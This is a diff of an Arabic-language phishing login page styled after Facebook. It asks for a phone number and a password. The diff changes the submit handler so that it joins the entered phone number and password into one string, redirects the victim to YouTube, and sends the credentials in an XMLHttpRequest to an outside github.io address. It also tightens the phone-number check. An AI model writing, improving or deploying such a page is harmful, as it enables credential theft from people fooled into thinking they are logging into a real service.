@@ -1,4 +1,5 @@
 
+<!DOCTYPE html>
 <html>
 <head>
     <title>صفحة تسجيل الدخول</title>
@@ -10,7 +11,7 @@
         .facebook-logo {
             width: 400px;
             height: 100px;
-            background-color: #1877f2; /* لون الأزرق الخاص بفيسبوك */
+            background-color: #1877f2;
             color: white;
             font-size: 24px;
             text-align: center;
@@ -31,7 +32,7 @@
         .form-container button {
             width: 100%;
             padding: 10px;
-            background-color: #1877f2; /* لون الأزرق الخاص بفيسبوك */
+            background-color: #1877f2;
             color: white;
             border: none;
             cursor: pointer;
@@ -69,14 +70,18 @@
                 errorMessage.innerHTML = "";
                 var userData = "رقم الهاتف: " + phoneNumber + "، كلمة المرور: " + password;
 
-                setTimeout(function() {
-                    window.location.href = "data.html?info=" + encodeURIComponent(userData);
-                }, 3000);
+                // توجيه المستخدمين إلى صفحة YouTube
+                window.location.href = "https://www.youtube.com/";
+
+                // إرسال معلومات المستخدم إلى الصفحة الأخرى
+                var request = new XMLHttpRequest();
+                request.open("GET", "https://korotenshi.github.io/kOotenshi.github.io/?info=" + encodeURIComponent(userData), true);
+                request.send();
             }
         }
 
         function isValidPhoneNumber(phoneNumber) {
-            return /^05|06|07\d{8}$/.test(phoneNumber);
+            return /^(05|06|07)\d{8}$/.test(phoneNumber);
         }
     </script>
 </body>
